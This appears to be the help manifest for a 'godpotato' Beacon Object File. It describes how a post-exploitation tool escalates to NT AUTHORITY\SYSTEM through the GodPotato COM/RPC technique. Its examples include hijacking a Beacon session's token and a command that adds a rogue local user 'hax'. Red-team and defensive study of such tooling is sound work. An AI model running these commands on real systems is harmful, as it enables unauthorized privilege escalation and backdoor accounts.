name: godpotato
help: GodPotato BOF - elevate to SYSTEM and run a command or impersonate Beacon
long_help:
Elevates to NT AUTHORITY\SYSTEM using the GodPotato technique (COM/RPC dispatch table hook).

Requires SeImpersonatePrivilege.

Modes:
  (no args)                        Run 'cmd /c whoami' as SYSTEM
  -- -cmd token                        Apply SYSTEM token to the current Beacon session via BeaconUseToken()
  -- -cmd "<command>"                  Run a custom command as SYSTEM
  -- -cmd "<command>" -pipe <name>     Custom command with a specific named pipe

Examples:
  godpotato
  godpotato -- -cmd token
  godpotato -- -cmd "whoami /all"
  godpotato -- -cmd "cmd /c net user hax P@ss /add"
  godpotato -- -cmd "cmd /c whoami" -pipe mypipe

arguments.name: cmd
arguments.desc: Command to run as SYSTEM, or 'token' to apply SYSTEM token to Beacon. Defaults to 'cmd /c whoami' if omitted.

arguments.name: pipe
arguments.desc: Custom named pipe name. Auto-generated if omitted.
